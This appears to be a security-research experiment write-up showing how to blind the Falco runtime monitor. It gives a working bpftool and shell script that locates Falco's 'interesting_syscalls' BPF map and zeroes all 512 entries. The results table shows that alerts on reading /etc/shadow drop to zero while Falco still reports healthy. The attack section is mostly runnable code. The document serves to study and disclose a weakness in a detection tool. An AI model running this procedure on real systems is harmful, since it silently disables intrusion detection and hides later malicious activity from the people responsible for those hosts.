# Experiment: Falco (latest) Total Blindness

## Objective

Verify that zeroing the `interesting_syscalls` BPF array causes complete Falco blindness.

## Setup

```bash
docker run -d --name falco-test \
  --privileged --pid=host \
  -v /etc/os-release:/etc/os-release-host:ro \
  -v /boot:/boot:ro \
  -v /lib/modules:/lib/modules:ro \
  -v /sys/kernel/debug:/sys/kernel/debug \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  falcosecurity/falco:latest
```

## Variables

- **Independent variable:** `interesting_syscalls` array entries (normal vs all-zero)
- **Dependent variable:** Number of Falco alerts
- **Control:** Same sensitive file access before and after modification

## Procedure

1. Wait 15s for Falco initialization (modern BPF probe)
2. Locate `interesting_syscalls` map via `bpftool map list` (name contains "interesting_sys")
3. Record baseline: read /etc/shadow, count new alerts
4. Poison: zero all 512 entries in interesting_syscalls array
5. Record post-poison: read /etc/shadow, count new alerts
6. Restore: restart container
7. Record post-restore: read /etc/shadow, count new alerts

## Attack Details

```bash
MAP_ID=$(bpftool map list -j | python3 -c "
import json,sys
[print(m['id']) for m in json.load(sys.stdin) if 'interesting_sys' in m.get('name','')]
")

# Zero all 512 entries
for i in $(seq 0 511); do
  KEY=$(printf '%02x %02x 00 00' $((i & 0xff)) $(((i >> 8) & 0xff)))
  bpftool map update id $MAP_ID key hex $KEY value hex 00
done
```

## Key Syscalls Affected

| Syscall NR | Name | Falco Rules Affected |
|-----------|------|---------------------|
| 59 | execve | Process execution monitoring |
| 257 | openat | Sensitive file access rules |
| 56 | clone | Process creation monitoring |
| 2 | open | File access monitoring |
| 87 | unlink | File deletion monitoring |
| 41 | socket | Network monitoring |
| 42 | connect | Network connection monitoring |

## Results

| Phase | interesting_syscalls[59] | interesting_syscalls[257] | Alerts |
|-------|------------------------|-------------------------|--------|
| Baseline | 1 | 1 | **1+** ("Sensitive file opened") |
| Post-poison | 0 | 0 | **0** |
| Post-restore | 1 | 1 | **1+** |

## Observations

- All 512 syscall entries zeroed in under 2 seconds
- BPF probes check `interesting_syscalls[NR]` at the earliest point — before any data collection
- Zero means "not interesting" — the BPF program returns immediately
- No error, no log, no alert generated during or after poisoning
- Falco continues running normally (health endpoint responds, rules loaded)
- Maps not pinned but easily enumerable via `bpftool map list`
- Recovery requires restart (Falco sets interesting_syscalls during init)

## Conclusion

Confirmed: Falco's kernel-level syscall filtering via `interesting_syscalls` is trivially bypassable. A single loop zeroing 512 array entries eliminates all monitoring.
